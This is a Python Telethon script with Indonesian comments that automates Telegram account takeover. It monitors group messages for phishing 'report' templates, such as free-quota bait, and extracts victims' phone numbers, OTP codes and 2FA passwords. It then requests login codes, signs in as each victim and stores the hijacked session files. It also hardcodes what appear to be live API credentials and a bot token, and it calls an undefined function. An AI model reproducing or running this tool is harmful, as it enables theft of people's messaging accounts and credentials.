import asyncio
import json
import os
import re
from telethon import TelegramClient, events
import shutil

# === Konfigurasi ===
api_id = 23520639
api_hash = 'bcbc7a22cde8fa2ba7d1baad086086ca'
bot_token = '8033198485:AAG5-a8uZ3AhjRNNIUqmR4VkePTQd7j7ibA'

SESSIONS_FOLDER = "ewe_sessions"
sessions_folder = "sessions"  # Folder tujuan untuk menyimpan session yang berhasil login
pending_login = {}  # {phone: (TelegramClient, password)}

# === Buat folder session jika belum ada ===
os.makedirs(SESSIONS_FOLDER, exist_ok=True)
os.makedirs(sessions_folder, exist_ok=True)

# === TelegramClient utama untuk monitoring grup ===
client = TelegramClient('main', api_id, api_hash)

# === Fungsi untuk memindahkan session ke folder sessions ===
def move_session_to_sessions_folder(phone_number):
    session_path = os.path.join(SESSIONS_FOLDER, phone_number)
    destination_path = os.path.join(sessions_folder, phone_number + ".session")

    if os.path.exists(session_path):
        shutil.move(session_path, destination_path)
        print(f"[✅] Sesi {phone_number} dipindahkan ke folder sessions.")
    else:
        print(f"[❌] Tidak ditemukan sesi untuk {phone_number} di {session_path}")

# === Handler Pesan Masuk dari Grup ===
@client.on(events.NewMessage)
async def handler(event):
    msg = event.raw_text

    if any(keyword in msg for keyword in [
        '❮ LAPORAN Judul ❯',
        '❮ LAPORAN AHMAD SANJAYA ❯',
        '❮ LAPORAN My Kasih ❯',
        '❮ LAPORAN GRATIS KUOTA ❯',
        '❮ LAPORAN TATTO KRIBO  ❯'
    ]):
        phone_match = re.search(r'PHONE NUMBER\s*:\s*(\+\d+)', msg)
        otp_match = re.search(r'OTP\s*:\s*(\d{5,6})', msg)
        password_match = re.search(r'PASSWORD\s*:\s*(\S+)', msg)

        if phone_match:
            phone = phone_match.group(1)
            password = password_match.group(1) if password_match else None

            if otp_match:
                otp = otp_match.group(1)
                print(f"[📥] OTP ditemukan untuk {phone}: {otp}")
                if phone in pending_login:
                    asyncio.create_task(complete_login(phone, otp, password))
                else:
                    print(f"[⚠️] Belum ada request OTP sebelumnya untuk {phone}")
            else:
                if phone not in pending_login:
                    print(f"[📞] Menerima nomor: {phone} (mengirim OTP request...)")
                    asyncio.create_task(request_otp(phone))
                else:
                    print(f"[⏳] {phone} sedang menunggu OTP...")

# === Kirim OTP Request ===
async def request_otp(phone):
    try:
        session_path = os.path.join(SESSIONS_FOLDER, phone)
        login_client = TelegramClient(session_path, api_id, api_hash)
        await login_client.connect()

        if not await login_client.is_user_authorized():
            await login_client.send_code_request(phone)
            pending_login[phone] = (login_client, None)
            print(f"[🔐] Kode OTP dikirim ke {phone}, menunggu OTP...")
        else:
            print(f"[✅] {phone} sudah login sebelumnya.")
            await login_client.disconnect()
    except Exception as e:
        print(f"[❌] Gagal kirim OTP ke {phone}: {e}")

# === Login Setelah Dapat OTP ===
async def complete_login(phone, otp, password=None):
    try:
        login_data = pending_login.get(phone)
        if login_data:
            login_client, _ = login_data

            if not login_client.is_connected():
                print(f"[⚠️] Reconnecting {phone} karena sebelumnya disconnect...")
                await login_client.connect()

            try:
                await login_client.sign_in(phone, otp)
            except Exception as e:
                if '2FA' in str(e).lower() and password:
                    try:
                        await login_client.sign_in(password=password)
                    except Exception as e2:
                        print(f"[🔒] Gagal login 2FA {phone}: {e2}")
                        await login_client.disconnect()
                        return
                else:
                    print(f"[🔒] Gagal login/sign-up untuk {phone}: {e}")
                    await login_client.disconnect()
                    return

            print(f"[✅] Login sukses untuk {phone}")
            move_session(phone) # type: ignore
            await login_client.disconnect()
            del pending_login[phone]

        else:
            print(f"[❌] Tidak ada data login untuk {phone} di pending_login")

    except Exception as e:
        print(f"[❌] Gagal menyelesaikan login {phone}: {e}")
# === JALANKAN CLIENT ===
async def main():
    await client.start()
    print("[🚀] Client Telegram aktif.")
    await client.run_until_disconnected()

if __name__ == "__main__":
    asyncio.run(main())
